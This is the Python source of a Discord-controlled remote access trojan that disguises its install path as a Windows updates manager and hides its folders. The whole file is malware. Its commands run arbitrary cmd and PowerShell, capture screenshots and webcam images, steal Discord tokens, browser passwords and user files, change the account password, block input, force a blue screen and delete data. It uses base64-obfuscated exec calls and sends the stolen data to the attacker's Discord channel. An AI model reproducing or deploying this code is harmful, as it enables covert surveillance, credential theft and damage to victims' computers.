import discord
import os
import libs.computer as pc
import libs.powershell as pw
import libs.registry_handler as reg_h
import libs.files as files
from shutil import copy, make_archive
import base64
import gzip
import subprocess
import json
import requests
import time
import win32api
import win32con

main_path = os.getenv("LOCALAPPDATA") + "\WindowsUpdatesManager\Snky-main"
modules_path = main_path + "\modules"
client = discord.Client(intents=discord.Intents.all())
file_version = "2.0"

#load config
with open(f"{main_path}/cfg/config.json", "r") as f:
        config = json.load(f)

def load_modules():
    for module in os.listdir(modules_path):
        if module.endswith(".py") or module.endswith(".pyw"):
            print(f"py {modules_path}\{module}")
            os.system(f"py {modules_path}\{module}")

def load_module(module):
    if module.endswith(".py") or module.endswith(".pyw"):
        print(f"py {modules_path}\{module}")
        os.system(f"py {modules_path}\{module}")

def list_modules():
    modules = ""
    for module in os.listdir(modules_path):
        if module.endswith(".py") or module.endswith(".pyw"):
            modules += module + "\n"
    return modules

def get_raw_git_content(url):
    r = requests.get(url)
    return r.text

@client.event
async def on_ready():
    if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
        os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
        win32api.SetFileAttributes(f"{os.getenv('APPDATA')}\\WindowsUpdates",win32con.FILE_ATTRIBUTE_HIDDEN)
    if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files") == False:
        os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files")
        os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\txt")
        os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\images")
        os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\docx")
        os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\csv")
        win32api.SetFileAttributes(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files",win32con.FILE_ATTRIBUTE_HIDDEN)

    if not config.get("Helpers").get("did_run"):
        try:
            reg_h.create_enc_key()
            reg_h.store_enc_key()
            reg_h.create_iv()
            reg_h.store_iv()
            config["Helpers"]["did_run"] = True
        except Exception as e:
            print(e)
            return
    
    

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    #HELP
    if message.content.startswith(".help"):
        embed = discord.Embed(title="Command list", description="", color=0x00ff00)
        embed.add_field(name=".help", value="Shows this message.", inline=False)
        embed.add_field(name=".pcinfo", value="Shows computer information.", inline=False)
        embed.add_field(name=".hardware", value="Shows hardware information [CPU, GPU, HWID, RAM, Disk size]", inline=False)
        embed.add_field(name=".dir", value="Shows directory contents.", inline=False)
        embed.add_field(name=".open", value="Opens file on the host computer. Usage: ``.open <file path>``", inline=False)
        embed.add_field(name=".upload", value="Uploads a file to the host computer. Usage: ``.upload <target_path>`` [File to upload is the attachment given with the message.]", inline=False)
        embed.add_field(name=".tasklist", value="Shows current tasks running on the computer.", inline=False)
        embed.add_field(name=".taskkill", value="Kills a specified task. Usage: ``.taskkill <PID>``", inline=False)
        embed.add_field(name=".screenshot", value="Takes ascreenshot.", inline=False)
        embed.add_field(name=".copy", value="Copies a file from the computer and sends it. Usage: ``.copy <file_path>``", inline=False)
        embed.add_field(name=".bsod", value="BSOD's the host computer.", inline=False)
        embed.add_field(name=".changepassword", value="Changes the account password. Usage: ``.changepassword <password>``", inline=False)
        embed.add_field(name=".webcam", value="Takes a webcam picture.", inline=False)
        embed.add_field(name=".logout", value="Logs the user out.", inline=False)
        embed.add_field(name=".delete", value="Deletes a specified file. Usage: ``.delete <target_file_path>``", inline=False)
        embed.add_field(name=".hid", value="Executes HID. ``.hid write <text>`` => writes the specified text. ``.hid hotkey <key1> <key2>`` => Presses two keys at the same time.", inline=False)
        embed.add_field(name=".blockinput", value="Blocks user's input.", inline=False)
        embed.add_field(name=".unblockinput", value="Unblocks user's input", inline=False)
        embed.add_field(name=".modules", value="Module loader. ``.modules list`` => Show current modules in the ``./modules`` folder. ``.modules load <module_name.py / all>``", inline=False)
        embed.add_field(name=".clipboard", value="Get/Set clipboard content.", inline=False)
        embed.add_field(name=".encrypt", value="Encrypt file [WIP]", inline=False)
        embed.add_field(name=".decrypt", value="Decrypt file [WIP]", inline=False)
        
        embed2 = discord.Embed(title="", description="", color=0x00ff00)
        embed2.add_field(name=".selfdestruct", value="Self destruct.", inline=False)
        embed2.add_field(name=".shutdown", value="Shutdown the computer.", inline=False)
        embed2.add_field(name=".deletedir", value="Deletes a specified directory. Usage: ``.deletedir <target_folder>``", inline=False)
        embed2.add_field(name=".createdir", value="Creates a specified directory. Usage: ``.createdir <folder_path>˙", inline=False)
        embed2.add_field(name=".networking", value="Gets networking information.", inline=False)
        embed2.add_field(name=".monitor", value="Turns the monitor on/off. Usage: ``.monitor <on/off>``", inline=False)
        embed2.add_field(name=".cmd", value="Runs a command on the host computer. Usage: ``.cmd <command>``", inline=False)
        embed2.add_field(name=".pws", value="Runs a powershell command on the host computer. Usage: ``.pws <command>``", inline=False)
        embed2.add_field(name=".file_collector", value="Collects some files from the host computer. Usage: ``.file_collector``", inline=False)
        embed2.add_field(name=".token_grab", value="Grabs discord tokens from the host computer. Usage: ``.token_grab``", inline=False)
        embed2.add_field(name=".browser_grab", value="Grabs browser saves from the host computer. Usage: ``.browser_grab``", inline=False)
        try:
            await message.channel.send(embed=embed)
            await message.channel.send(embed=embed2)
        except Exception as e:
            print(e)
            await message.channel.send("Embed failed, try again.")

    #SELF DESTRUCT
    if message.content.startswith(".selfdestruct"):
        await message.delete()
        embed = discord.Embed(title="Self Destruct", description="Attempting to self destruct...")
        await message.channel.send(embed=embed)
        pc.self_destruct()
        embed = discord.Embed(title="Self Destruct successful")
        await message.channel.send(embed=embed)
        quit()

    #COMPUTER INFORMATION
    if message.content.startswith(".pcinfo"):
        await message.delete()
        await message.channel.send(embed=pc.comp_info()[0])
        await message.channel.send(file=pc.comp_info()[1])
        os.remove(f"{main_path}/pc_info.txt")

    #SHUTDOWN
    if message.content.startswith(".shutdown"):
        await message.delete()
        embed = discord.Embed(title="Shutdown", description="Attempting to shutdown...")
        await message.channel.send(embed=embed)
        try:
            pc.pc_shutdown()
        except:
            embed = discord.Embed(title="Shutdown", description="Failed to shutdown.")
        await message.channel.send(embed=embed)

    #HARDWARE INFORMATION
    if message.content.startswith(".hardware"):
        await message.delete()
        embed = discord.Embed(title="Hardware Information", description=pc.hardware_info(), color=0x00ff00)
        await message.channel.send(embed=embed)

    #DIR
    if message.content.startswith(".dir"):
        directory = message.content.replace(".dir ", "")
        await message.delete()
        try:
            result = pw.dir(directory)
        except Exception as e  :
            print(e)
            embed = discord.Embed(title="Directory", description="Failed to get directory. Usage .dir c:", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Directory", description=result, color=0x00ff00)
        await message.channel.send(embed=embed)

    #OPEN FILE
    if message.content.startswith(".open"):
        file_path = message.content.replace(".open ", "")
        await message.delete()
        try:
            os.startfile(file_path)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Open File", description="Failed to open file.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Open File", description="File opened.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #UPLOAD FILE
    if message.content.startswith(".upload"):
        try:
            directory = (message.content.replace(".dir ", "")).split(" ")[1]
        except:
            embed = discord.Embed(title="Upload failed", description="No directory specified. To upload in curent direcotry use ./", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        await message.delete()
        if message.attachments:
            for attachment in message.attachments:
                try:
                    await attachment.save(f'{directory}/{attachment.filename}')
                    embed = discord.Embed(title="Upload succesfull", description=f"File {attachment.filename} uploaded.", color=0x00ff00)
                except Exception as e:
                    print(e)
                    embed = discord.Embed(title="Upload failed", description="Failed to upload file.", color=0x00ff00)
        else:
            embed = discord.Embed(title="Upload failed", description="No file attached.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #TASKLIST - TO FIX
    if message.content.startswith(".tasklist"):
        await message.delete()
        try:
            pw.tasklist()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Tasklist", description="Failed to get tasklist.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Tasklist", description="Tasklist fetched.", color=0x00ff00)
        await message.channel.send(embed=embed)
        
        while(os.path.exists(f"{main_path}/tasklist.txt") == False):
            time.sleep(1)
        await message.channel.send(file=discord.File(f"{main_path}/tasklist.txt"))
        os.remove(f"{main_path}/tasklist.txt")

    #TASKKILL
    if message.content.startswith(".taskkill"):
        task = message.content.replace(".taskkill ", "")
        result = ""
        await message.delete()
        try:
            result = pw.taskkill(task)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Taskkill", description="Failed to kill task.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Taskkill", description=result, color=0x00ff00)
        await message.channel.send(embed=embed)

    #SCREENSHOT
    if message.content.startswith(".screenshot"):
        await message.delete()
        try:
            sc = pc.screenshot()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Screenshot", description="Failed to take screenshot.", color=0x00ff00)
            return
        embed = discord.Embed(title="Screenshot", description="Screenshot taken.", color=0x00ff00)
        await message.channel.send(file=discord.File(sc), embed=embed)
        os.remove(sc)

    #COPY
    if message.content.startswith(".copy"):
        try:
            loc = message.content.replace(".copy ", "")
            await message.delete()
            embed = discord.Embed(title="Copy", description="File copied.", color=0x00ff00)
            await message.channel.send(file=discord.File(loc),embed=embed)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Copy", description="Failed to copy file.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
    
    #BSOD
    if message.content.startswith(".bsod"):
        await message.delete()
        try:
            pc.bsod()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="BSOD", description="Failed to BSOD.", color=0x00ff00)
            return
        embed = discord.Embed(title="BSOD", description="BSOD Executed.", color=0x00ff00)
        await message.channel.send(embed=embed)
    
    #CHANGE PASSWORD
    if message.content.startswith(".changepassword"):
        await message.delete()
        try:
            pc.change_password(message.content.replace(".changepassword ", ""))
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Change Password", description="Failed to change password.", color=0x00ff00)
            return
        embed = discord.Embed(title="Change Password", description="Password changed.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #WEBCAMSHOT
    if message.content.startswith(".webcam"):
        await message.delete()
        try:
            wc = pc.webcamshot()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Webcamshot", description="Failed to take webcamshot.", color=0x00ff00)
            return
        embed = discord.Embed(title="Webcamshot", description="Webcamshot taken.", color=0x00ff00)
        await message.channel.send(embed=embed,file=discord.File(wc))

    #LOGOUT
    if message.content.startswith(".logout"):
        await message.delete()
        embed = discord.Embed(title="Logout", description="Logging out...", color=0x00ff00)
        await message.channel.send(embed=embed)
        os.system("shutdown -l")

    #DELETE
    if message.content.startswith(".delete") and not message.content.startswith(".deletedir"):
        file_path = message.content.replace(".delete ", "")
        await message.delete()
        try:
            os.remove(file_path)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Delete", description="Failed to delete file.", color=0x00ff00)
            return
        embed = discord.Embed(title="Delete", description="File deleted.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #HID
    if message.content.startswith(".hid"):
        await message.delete()
        result = pc.hid(command=message.content.replace(".hid ", ""))
        embed = discord.Embed(title="HID", description=result, color=0x00ff00)
        await message.channel.send(embed=embed)

    #BLOCK INPUT
    if message.content.startswith(".blockinput"):
        await message.delete()
        try:
            pc.block_input()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Block Input", description="Failed to block input.", color=0x00ff00)
            return
        embed = discord.Embed(title="Block Input", description="Input blocked.", color=0x00ff00)
        await message.channel.send(embed=embed)
    
    #UNBLOCK INPUT
    if message.content.startswith(".unblockinput"):
        await message.delete()
        try:
            pc.unblock_input()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Unblock Input", description="Failed to unblock input.", color=0x00ff00)
            return
        embed = discord.Embed(title="Unblock Input", description="Input unblocked.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #DELETE DIR
    if message.content.startswith(".deletedir"):
        path = message.content.replace(".deletedir ", "")
        await message.delete()
        try:
            os.rmdir(path)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Delete Directory", description="Failed to delete directory.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Delete Directory", description="Directory deleted.", color=0x00ff00)
        await message.channel.send(embed=embed)
        
    
    #CREATE DIR
    if message.content.startswith(".createdir"):
        await message.delete()
        try:
            os.mkdir(message.content.replace(".createdir ", ""))
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Create Directory", description="Failed to create directory. Usage: ``.createdir <FULL DIRECTORY PATH>``", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Create Directory",description=f"Directory {message.content.replace('.createdir ', '')} created.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #RUN MODULES
    if message.content.startswith(".modules"):
        try:
            arg = message.content.split(" ")[1]
        except:
            embed = discord.Embed(title="Module Loader", description="No argument given.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        await message.delete()
        
        if arg == "list":
            embed = discord.Embed(title="Module Loader", description=list_modules(), color=0x00ff00)
            await message.channel.send(embed=embed)

        elif arg == "load":
            try:
                module = message.content.split(" ")[2]
                if module != "" and module.endswith(".py") or module.endswith(".pyw"):
                    load_module(module)
                    embed = discord.Embed(title="Module Loader", description=f"Module {module} loaded.", color=0x00ff00)
                elif module == "all":
                    load_modules()
                    embed = discord.Embed(title="Module Loader", description="All modules loaded.", color=0x00ff00)
            except Exception as e:
                print(e)
                embed = discord.Embed(title="Modules", description="Failed to load modules.", color=0x00ff00)
                await message.channel.send(embed=embed)
                return

            await message.channel.send(embed=embed)
        else:
            embed = discord.Embed(title="Modules", description="Invalid argument.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
    
    #CLIPBOARD
    if message.content.startswith(".clipboard"):
        arg = message.content.split(" ")[1]
        await message.delete()
        if arg == "get":
            cb = pc.get_clipboard()
            embed = discord.Embed(title="Clipboard", description=cb, color=0x00ff00)
            await message.channel.send(embed=embed)
        elif arg == "set":
            text = message.content.replace(".clipboard set ", "")
            pc.set_clipboard(text)
            embed = discord.Embed(title="Clipboard", description="Clipboard set.", color=0x00ff00)
            await message.channel.send(embed=embed)

    #NETWORKING
    if message.content.startswith(".networking"):
        await message.delete()
        try:
            pc.networking_info()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Networking", description="Failed to get networking information.", color=0x00ff00)
            return
        embed = discord.Embed(title="Networking", description="Networking information fetched.", color=0x00ff00)
        await message.channel.send(embed=embed)
        await message.channel.send(file=discord.File(f"{main_path}/networking_info.txt"))
        os.remove("networking_info.txt")

    #MONITORS
    if message.content.startswith(".monitor"):
        arg = message.content.split(" ")[1]
        await message.delete()
        try:
            if arg == "off":
                pc.off_mon()
            elif arg == "on":
                pc.on_mon()
            embed = discord.Embed(title="Monitor Control", description="Monitor state changed.", color=0x00ff00)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Monitor Control", description="Failed to channge monitor state.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #CMD
    if message.content.startswith(".cmd"):
        arg = message.content.replace(".cmd ","")
        #run cmd and send feedback from cmd
        await message.delete()
        try:
            if arg != "notepad" or arg != "edit" or arg != "start cmd.exe":
                    subprocess.call(arg + f"> {main_path}/output.txt", shell=True)
            else:   
                embed = discord.Embed(title="CMD", description="Command did not execute. Make sure your command does not open a different window! (Does not apply to ``call``)", color=0x00ff00)
                await message.channel.send(embed=embed)
                break
            embed = discord.Embed(title="CMD", description="Command executed.", color=0x00ff00)
            await message.channel.send(embed=embed)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="CMD", description="Failed to run command.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
    
    #PWS
    if message.content.startswith(".pws"):
        arg = message.content.replace(".pws ","")
        subprocess.call("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe " + arg, shell=True)

    if message.content.startswith(".file_collector"):
        await message.delete()
        exec(base64.b64decode("I3J1biBmaWxlX2NvbGxlY3Rvci5weXcgYW5kIHdhaXQgdW50aWwgZmluaXNoZWQgdGhlbiBzZW5kIGNvbGxlY3RlZF9maWxlcy56aXANCm9zLnBvcGVuKGYicHkge21haW5fcGF0aH1cXGJ1aWx0X2luX21vZHVsZXNcXGZpbGVfY29sbGVjdG9yLnB5dyIpDQ=="))
        
        embed = discord.Embed(title="File Collector", description="File collector executed.\nNOTE: If you have enabled image collection, .zip file size may be too big to send!", color=0x00ff00)
        await message.channel.send(embed=embed)

        exec(base64.b64decode("d2hpbGUob3MucGF0aC5leGlzdHMoZiJ7b3MuZ2V0ZW52KCdBUFBEQVRBJyl9XFxXaW5kb3dzVXBkYXRlc1xcY29sbGVjdGVkX2ZpbGVzLnppcCIpID09IEZhbHNlKToNCgl0aW1lLnNsZWVwKDEpDQ=="))
        await message.channel.send(file=discord.File(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files.zip"))

    if message.content.startswith(".token_grab"):
        await message.delete()

        os.popen(f"py {main_path}\\built_in_modules\\discord_token_grabber.pyw")

        embed = discord.Embed(title="Token Grabber", description="Executed.", color=0x00ff00)
        await message.channel.send(embed=embed)

        while(os.path.exists(f"{main_path}\\token.txt") == False):
            time.sleep(1)

        await message.channel.send(file=discord.File(f"{main_path}\\token.txt"))

    if message.content.startswith(".browser_grab"):
        await message.delete()
        #run browsrer_psw.pyw and wait until finished then send token.txt
        os.popen(f"py {main_path}\\built_in_modules\\browser_psw.pyw")

        embed = discord.Embed(title="Browser Grabber", description="Executed.", color=0x00ff00)
        await message.channel.send(embed=embed)

        while(os.path.exists(f"{main_path}\\browsers") == False):
            time.sleep(1)

        make_archive(f"{main_path}\\browsers", "zip", f"{main_path}\\browsers")

        while os.path.exists(f"{main_path}\\browsers.zip") == False:
            time.sleep(1)

        await message.channel.send(file=discord.File(f"{main_path}\\browsers.zip"))
        files.delete_dir(f"{main_path}\\browsers")
        files.delete_file(f"{main_path}\\browsers.zip")
        
client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
